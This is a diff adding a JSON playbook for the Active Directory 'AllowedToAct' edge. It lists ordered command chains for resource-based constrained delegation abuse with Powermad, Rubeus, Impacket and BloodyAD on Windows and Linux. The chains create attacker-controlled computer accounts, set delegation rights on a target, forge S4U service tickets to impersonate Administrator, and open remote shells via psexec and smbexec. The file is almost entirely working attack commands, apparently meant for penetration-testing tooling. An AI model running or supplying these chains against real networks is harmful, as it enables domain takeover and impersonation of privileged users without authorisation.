@@ -1,0 +1,135 @@
+{
+    "AllowedToAct": {
+        "meaning": "This edge allows an attacker to abuse resource-based constrained delegation to compromise the target. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object. An attacker can execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket as this user.",
+        "common": "",
+        "windows": {
+            "Powermad_Rubeus": [
+                {
+                    "order": 1,
+                    "command": "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)",
+                    "description": "Create new attacker-controlled computer account with SPN using Powermad"
+                },
+                {
+                    "order": 2,
+                    "command": "$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid",
+                    "description": "Retrieve security identifier (SID) of newly created computer account"
+                },
+                {
+                    "order": 3,
+                    "command": "$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"",
+                    "description": "Build generic ACE with attacker computer SID as principal for DACL"
+                },
+                {
+                    "order": 4,
+                    "command": "$SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)",
+                    "description": "Get binary bytes for the new DACL/ACE security descriptor"
+                },
+                {
+                    "order": 5,
+                    "command": "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}",
+                    "description": "Set security descriptor in msDS-AllowedToActOnBehalfOfOtherIdentity field"
+                },
+                {
+                    "order": 6,
+                    "command": "Rubeus.exe hash /password:Summer2018!",
+                    "description": "Hash plaintext password into RC4_HMAC form for authentication"
+                },
+                {
+                    "order": 7,
+                    "command": "Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt",
+                    "description": "Execute S4U2self/S4U2proxy to get service ticket and impersonate admin user"
+                }
+            ],
+            "Rubeus_Simple": [
+                {
+                    "order": 1,
+                    "command": "# Ensure control of account with SPN for resource-based constrained delegation",
+                    "description": "Prerequisite: Control account with service principal name"
+                },
+                {
+                    "order": 2,
+                    "command": "Rubeus.exe s4u /user:CONTROLLED_ACCOUNT$ /aes256:KEY /impersonateuser:Administrator /msdsspn:HOST/TARGET /ptt",
+                    "description": "Perform S4U delegation attack to impersonate Administrator on target"
+                },
+                {
+                    "order": 3,
+                    "command": "dir \\\\TARGET\\C$",
+                    "description": "Test access to target system using impersonated credentials"
+                }
+            ]
+        },
+        "linux": {
+            "Impacket_getST": [
+                {
+                    "order": 1,
+                    "command": "addcomputer.py domain.com/user:password -computer-name 'ATTACK$' -computer-pass 'AttackPass123'",
+                    "description": "Create new computer account for resource-based constrained delegation"
+                },
+                {
+                    "order": 2,
+                    "command": "python3 rbcd.py domain.com/user:password -delegate-from 'ATTACK$' -delegate-to 'TARGET$' -action write",
+                    "description": "Configure resource-based constrained delegation on target"
+                },
+                {
+                    "order": 3,
+                    "command": "getST.py -spn HOST/TARGET.domain.com -impersonate Administrator domain.com/ATTACK$:AttackPass123",
+                    "description": "Request service ticket via S4U2self/S4U2proxy to impersonate Administrator"
+                },
+                {
+                    "order": 4,
+                    "command": "export KRB5CCNAME=Administrator.ccache",
+                    "description": "Set Kerberos credential cache to use impersonated ticket"
+                },
+                {
+                    "order": 5,
+                    "command": "psexec.py -k -no-pass domain.com/Administrator@TARGET.domain.com",
+                    "description": "Execute commands as Administrator using Kerberos authentication"
+                }
+            ],
+            "Manual_RBCD": [
+                {
+                    "order": 1,
+                    "command": "python3 addcomputer.py -computer-name EVIL$ -computer-pass EvilPass123 domain.com/user:password",
+                    "description": "Add computer account with known password for RBCD attack"
+                },
+                {
+                    "order": 2,
+                    "command": "python3 rbcd.py domain.com/user:password -action write -delegate-to TARGET$ -delegate-from EVIL$",
+                    "description": "Configure resource-based constrained delegation permissions"
+                },
+                {
+                    "order": 3,
+                    "command": "getTGT.py domain.com/EVIL$:EvilPass123",
+                    "description": "Obtain TGT for controlled computer account"
+                },
+                {
+                    "order": 4,
+                    "command": "getST.py -spn cifs/TARGET.domain.com -impersonate domain_admin domain.com/EVIL$ -k -no-pass",
+                    "description": "Impersonate domain admin via S4U2proxy delegation"
+                },
+                {
+                    "order": 5,
+                    "command": "smbexec.py -k -no-pass domain.com/domain_admin@TARGET.domain.com",
+                    "description": "Access target system as impersonated domain administrator"
+                }
+            ],
+            "BloodyAD": [
+                {
+                    "order": 1,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD add computer ATTACK AttackPass123",
+                    "description": "Create computer account using BloodyAD for RBCD attack"
+                },
+                {
+                    "order": 2,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set rbcd 'CN=TARGET,CN=Computers,DC=domain,DC=com' 'CN=ATTACK,CN=Computers,DC=domain,DC=com'",
+                    "description": "Configure resource-based constrained delegation using BloodyAD"
+                },
+                {
+                    "order": 3,
+                    "command": "getST.py -spn HOST/TARGET -impersonate Administrator domain.com/ATTACK$:AttackPass123",
+                    "description": "Impersonate Administrator using configured delegation rights"
+                }
+            ]
+        }
+    }
+}
